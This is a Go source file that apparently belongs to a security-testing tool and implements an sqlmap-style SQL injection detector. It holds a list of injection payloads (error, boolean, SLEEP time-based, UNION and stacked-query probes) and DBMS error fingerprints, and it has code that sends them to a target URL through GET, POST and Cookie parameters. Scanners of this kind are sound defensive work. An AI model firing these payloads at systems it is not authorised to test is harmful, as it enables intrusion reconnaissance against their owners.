package nativetools

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"
)

// sqlmapFinding mirrors the sqlmap parser's log finding shape
// (internal/app/sqlmap_parser.go: url, parameter, place, techniques, vulnerable).
type sqlmapFinding struct {
	URL        string   `json:"url"`
	Parameter  string   `json:"parameter"`
	Place      string   `json:"place"`
	Techniques []string `json:"techniques"`
	DBMS       string   `json:"dbms,omitempty"`
	Title      string   `json:"title"`
	Vulnerable bool     `json:"vulnerable"`
}

// SQL injection detection: error-based, boolean-based blind, time-based
// blind, UNION-column and stacked-query probes across GET query, POST body
// and Cookie places, with DBMS fingerprinting from error signatures. Data
// extraction and exploitation remain with the managed sqlmap.

// sqlPlace identifies where a parameter is injected.
const (
	sqlPlaceGet    = "GET"
	sqlPlacePost   = "POST"
	sqlPlaceCookie = "Cookie"
)

// sqlTechnique names mirror sqlmap's technique letters.
const (
	techniqueError   = "error-based"
	techniqueBoolean = "boolean-based blind"
	techniqueTime    = "time-based blind"
	techniqueUnion   = "UNION query"
	techniqueStacked = "stacked queries"
)

// sqlProbe is one payload applied to one parameter.
type sqlProbe struct {
	Value     string
	Technique string
	// SleepMillis is the delay a vulnerable time-based payload induces.
	SleepMillis int
	// ExpectTrue / ExpectFalse drive boolean pairs: the pair matches only
	// when ExpectTrue's response equals the baseline and ExpectFalse's
	// differs (or vice versa for the negative variant).
	BooleanPair bool
	// UnionColumn is the column count a UNION probe targets.
	UnionColumn int
}

// sqlParamProbes maps parameter names to their probe set. Payloads cover the
// five sqlmap techniques; the SLEEP variants pair with a baseline request
// to distinguish injection-induced delay from network jitter.
var sqlParamProbes = map[string][]sqlProbe{
	"default": {
		// error-based probes (detection via DBMS error signatures)
		{Value: "'", Technique: techniqueError},
		{Value: `"`, Technique: techniqueError},
		{Value: "1'", Technique: techniqueError},
		{Value: "1)", Technique: techniqueError},
		{Value: "' OR '1'='1", Technique: techniqueError},
		// boolean-based pairs (1=1 mirrors baseline, 1=2 must differ)
		{Value: "1 AND 1=1", Technique: techniqueBoolean, BooleanPair: true},
		{Value: "1 AND 1=2", Technique: techniqueBoolean, BooleanPair: true},
		{Value: "' AND 'a'='a", Technique: techniqueBoolean, BooleanPair: true},
		{Value: "' AND 'a'='b", Technique: techniqueBoolean, BooleanPair: true},
		// time-based (MySQL/PostgreSQL/SQLite variants)
		{Value: "1 AND SLEEP(5)", Technique: techniqueTime, SleepMillis: 4000},
		{Value: "1; SELECT SLEEP(5)", Technique: techniqueTime, SleepMillis: 4000},
		{Value: "1 AND (SELECT PG_SLEEP(5))", Technique: techniqueTime, SleepMillis: 4000},
		{Value: "1' AND SLEEP(5)-- -", Technique: techniqueTime, SleepMillis: 4000},
		// UNION column probes (null-filled columns keep SQL valid)
		{Value: "1 UNION SELECT NULL", Technique: techniqueUnion, UnionColumn: 1},
		{Value: "1 UNION SELECT NULL,NULL", Technique: techniqueUnion, UnionColumn: 2},
		{Value: "1 UNION SELECT NULL,NULL,NULL", Technique: techniqueUnion, UnionColumn: 3},
		{Value: "1 UNION SELECT NULL,NULL,NULL,NULL", Technique: techniqueUnion, UnionColumn: 4},
		{Value: "1 UNION SELECT NULL,NULL,NULL,NULL,NULL", Technique: techniqueUnion, UnionColumn: 5},
		// stacked queries
		{Value: "1; SELECT 1", Technique: techniqueStacked},
		{Value: "'; SELECT 1-- -", Technique: techniqueStacked},
	},
}

// sqlFingerprints map error signatures to DBMS names.
var sqlFingerprints = []struct {
	Signature string
	DBMS      string
}{
	{"you have an error in your sql syntax", "MySQL"},
	{"warning: mysql", "MySQL"},
	{"mysql_fetch", "MySQL"},
	{"unclosed quotation mark after the character string", "MSSQL"},
	{"microsoft ole db provider for sql server", "MSSQL"},
	{"microsoft sql server", "MSSQL"},
	{"quoted string not properly terminated", "Oracle"},
	{"ora-01756", "Oracle"},
	{"oracle jdbc driver", "Oracle"},
	{"pg_query()", "PostgreSQL"},
	{"postgresql", "PostgreSQL"},
	{"pg_admin", "PostgreSQL"},
	{"sqlite3.operationalerror", "SQLite"},
	{"sqlite3.", "SQLite"},
	{"sqlite_", "SQLite"},
	{"sqlstate[", "SQLAlchemy"},
	{"jdbc", "Java/JDBC"},
	{"ibm db2", "DB2"},
	{"db2 sql error", "DB2"},
}

// unionMarker is the sentinel a UNION probe echoes back on success.
const unionMarker = "OUROUNION7f3a"

// unionProbeByColumn renders the null-filled UNION payload whose column
// count the target echoes.
var unionProbeByColumn = map[int]string{
	1: "1 UNION SELECT '" + unionMarker + "'",
	2: "1 UNION SELECT '" + unionMarker + "',NULL",
	3: "1 UNION SELECT '" + unionMarker + "',NULL,NULL",
	4: "1 UNION SELECT '" + unionMarker + "',NULL,NULL,NULL",
	5: "1 UNION SELECT '" + unionMarker + "',NULL,NULL,NULL,NULL",
}

// sqlParameterCandidates are the parameter names probed when discovery
// finds nothing.
var sqlParameterCandidates = []string{"id", "q", "page", "search", "cat", "category", "user", "name", "item", "view"}

// discoveredSQLParameters extracts candidate parameter names from a
// response: form inputs and links carrying query strings.
func discoveredSQLParameters(body string) []string {
	names := map[string]bool{}
	for _, match := range regexp.MustCompile(`(?i)<input[^>]+name=["']?([a-z0-9_\-]+)["']?`).FindAllStringSubmatch(body, -1) {
		names[strings.TrimSpace(match[1])] = true
	}
	for _, match := range regexp.MustCompile(`(?i)[?&]([a-z0-9_\-]+)=`).FindAllStringSubmatch(body, -1) {
		names[strings.TrimSpace(match[1])] = true
	}
	list := make([]string, 0, len(names))
	for name := range names {
		list = append(list, name)
	}
	sort.Strings(list)
	return list
}

// sqlResponse is one captured round trip.
type sqlResponse struct {
	Status     int
	Body       string
	Elapsed    time.Duration
	ElapsedSet bool
}

// sqlDetect runs the full detection suite against one target URL.
func sqlDetect(ctx context.Context, client *http.Client, target string, opts Options) ([]sqlmapFinding, error) {
	base := normalizeURL(target)
	if base == "" {
		return nil, fmt.Errorf("injection_test requires a target url")
	}
	parsed, err := url.Parse(base)
	if err != nil {
		return nil, fmt.Errorf("parse injection target: %w", err)
	}

	// Baseline: the unmodified target.
	baseline, err := sqlFetch(ctx, client, parsed, nil, sqlPlaceGet, "")
	if err != nil {
		return nil, fmt.Errorf("baseline request: %w", err)
	}

	parameters := sqlParameterCandidates
	if discovered := discoveredSQLParameters(baseline.Body); len(discovered) > 0 {
		parameters = discovered
	}

	findings := []sqlmapFinding{}
	seen := map[string]bool{}

	record := func(param, place, technique, dbms, title string) {
		key := param + "|" + place + "|" + technique
		if seen[key] {
			return
		}
		seen[key] = true
		findings = append(findings, sqlmapFinding{
			URL:        base,
			Parameter:  param,
			Place:      place,
			Techniques: []string{technique},
			DBMS:       dbms,
			Title:      title,
			Vulnerable: true,
		})
	}

	for _, param := range parameters {
		probes := sqlParamProbes["default"]

		// Boolean pairs: the true-arm must mirror the baseline while the
		// false-arm differs, or the mirrored pair flipped (classic oracle).
		trueResp, trueErr := sqlFetch(ctx, client, parsed, map[string]string{param: "1 AND 1=1"}, sqlPlaceGet, "")
		falseResp, falseErr := sqlFetch(ctx, client, parsed, map[string]string{param: "1 AND 1=2"}, sqlPlaceGet, "")
		if trueErr == nil && falseErr == nil {
			if sqlResponsesDiffer(falseResp, baseline) && !sqlResponsesDiffer(trueResp, baseline) {
				record(param, sqlPlaceGet, techniqueBoolean, "", "boolean-based blind: 1=1 mirrors baseline, 1=2 differs")
			}
		}

		for _, probe := range probes {
			select {
			case <-ctx.Done():
				return findings, ctx.Err()
			default:
			}
			switch probe.Technique {
			case techniqueError:
				resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: probe.Value}, sqlPlaceGet, "")
				if err != nil {
					continue
				}
				if dbms := sqlFingerprintDBMS(resp.Body); dbms != "" {
					record(param, sqlPlaceGet, techniqueError, dbms, "error signature reflected for payload "+truncate(probe.Value, 40))
				}
			case techniqueTime:
				resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: probe.Value}, sqlPlaceGet, "")
				if err != nil {
					continue
				}
				if baseline.ElapsedSet && resp.ElapsedSet && resp.Elapsed-baseline.Elapsed >= time.Duration(probe.SleepMillis)*time.Millisecond {
					record(param, sqlPlaceGet, techniqueTime, "", fmt.Sprintf("response delayed by %s with %s", resp.Elapsed-baseline.Elapsed, truncate(probe.Value, 40)))
				}
			case techniqueUnion:
				payload, ok := unionProbeByColumn[probe.UnionColumn]
				if !ok {
					continue
				}
				resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: payload}, sqlPlaceGet, "")
				if err != nil {
					continue
				}
				if strings.Contains(resp.Body, unionMarker) {
					record(param, sqlPlaceGet, techniqueUnion, "", fmt.Sprintf("UNION with %d columns echoes the sentinel", probe.UnionColumn))
				}
			case techniqueStacked:
				resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: probe.Value}, sqlPlaceGet, "")
				if err != nil {
					continue
				}
				// A stacked query is only evidence when the response differs
				// from the baseline without a DBMS error: the second statement
				// executed and changed the result. A plain 200 identical to the
				// baseline proves nothing.
				if sqlResponsesDiffer(resp, baseline) && sqlFingerprintDBMS(resp.Body) == "" {
					record(param, sqlPlaceGet, techniqueStacked, "", "stacked query changed the response without an error")
				}
			}
		}

		// POST body place: only when the target looks like a form endpoint.
		if strings.Contains(strings.ToLower(baseline.Body), "<form") {
			for _, probe := range []sqlProbe{
				{Value: "1'", Technique: techniqueError},
				{Value: "1 AND 1=1", Technique: techniqueBoolean},
				{Value: "1 UNION SELECT '" + unionMarker + "',NULL,NULL", Technique: techniqueUnion, UnionColumn: 3},
			} {
				resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: probe.Value}, sqlPlacePost, "application/x-www-form-urlencoded")
				if err != nil {
					continue
				}
				if dbms := sqlFingerprintDBMS(resp.Body); dbms != "" {
					record(param, sqlPlacePost, probe.Technique, dbms, "POST body payload reflected a DBMS error")
				}
				if strings.Contains(resp.Body, unionMarker) {
					record(param, sqlPlacePost, techniqueUnion, "", "POST UNION probe echoed the sentinel")
				}
			}
		}

		// Cookie place: probe when the baseline carries cookies.
		if strings.Contains(baseline.Body, "cookie") || strings.Contains(baseline.Body, "session") {
			resp, err := sqlFetch(ctx, client, parsed, map[string]string{param: "1'"}, sqlPlaceCookie, "")
			if err == nil {
				if dbms := sqlFingerprintDBMS(resp.Body); dbms != "" {
					record(param, sqlPlaceCookie, techniqueError, dbms, "Cookie payload reflected a DBMS error")
				}
			}
		}
	}

	sort.Slice(findings, func(i, j int) bool {
		if findings[i].Parameter != findings[j].Parameter {
			return findings[i].Parameter < findings[j].Parameter
		}
		return findings[i].Techniques[0] < findings[j].Techniques[0]
	})
	return findings, nil
}

// sqlFetch performs one request with the parameter injected into the chosen
// place (GET query, POST body or Cookie header).
func sqlFetch(ctx context.Context, client *http.Client, base *url.URL, params map[string]string, place string, contentType string) (sqlResponse, error) {
	target := *base
	started := time.Now()

	var req *http.Request
	var err error
	switch place {
	case sqlPlacePost:
		form := url.Values{}
		for key, value := range params {
			form.Set(key, value)
		}
		for key, values := range target.Query() {
			if _, injected := params[key]; !injected {
				for _, value := range values {
					form.Set(key, value)
				}
			}
		}
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, target.String(), strings.NewReader(form.Encode()))
		if err != nil {
			return sqlResponse{}, err
		}
		if contentType != "" {
			req.Header.Set("Content-Type", contentType)
		} else {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case sqlPlaceCookie:
		cookies := []string{}
		for key, value := range params {
			cookies = append(cookies, key+"="+value)
		}
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, target.String(), nil)
		if err != nil {
			return sqlResponse{}, err
		}
		req.Header.Set("Cookie", strings.Join(cookies, "; "))
	default: // GET
		values := target.Query()
		for key, value := range params {
			values.Set(key, value)
		}
		target.RawQuery = values.Encode()
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, target.String(), nil)
		if err != nil {
			return sqlResponse{}, err
		}
	}
	req.Header.Set("User-Agent", "ouroboros-native-sqlmap/1")

	resp, err := client.Do(req)
	if err != nil {
		return sqlResponse{}, err
	}
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	if err != nil {
		return sqlResponse{}, err
	}
	return sqlResponse{
		Status:     resp.StatusCode,
		Body:       string(body),
		Elapsed:    time.Since(started),
		ElapsedSet: true,
	}, nil
}

// sqlResponsesDiffer reports whether two responses are observably different
// (status or body length beyond noise).
func sqlResponsesDiffer(a, b sqlResponse) bool {
	if a.Status != b.Status {
		return true
	}
	return absInt(len(a.Body)-len(b.Body)) > 1
}

func absInt(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

// sqlFingerprintDBMS maps error text to a DBMS name ("" when none match).
func sqlFingerprintDBMS(body string) string {
	lower := strings.ToLower(body)
	for _, fingerprint := range sqlFingerprints {
		if strings.Contains(lower, fingerprint.Signature) {
			return fingerprint.DBMS
		}
	}
	return ""
}

func truncate(value string, max int) string {
	if len(value) <= max {
		return value
	}
	return value[:max] + "…"
}

// DetectInjection probes candidate parameters across GET/POST/Cookie places
// with error-, boolean-, time-, UNION- and stacked-based techniques and
// fingerprints the DBMS. Exploitation (data extraction, takeover) stays
// with the managed sqlmap.
func DetectInjection(ctx context.Context, target string, opts Options) (string, error) {
	findings, err := sqlDetect(ctx, opts.httpClient(), target, opts)
	if err != nil {
		return "", err
	}
	encoded, err := json.Marshal(findings)
	if err != nil {
		return "", fmt.Errorf("encode injection findings: %w", err)
	}
	return string(encoded), nil
}
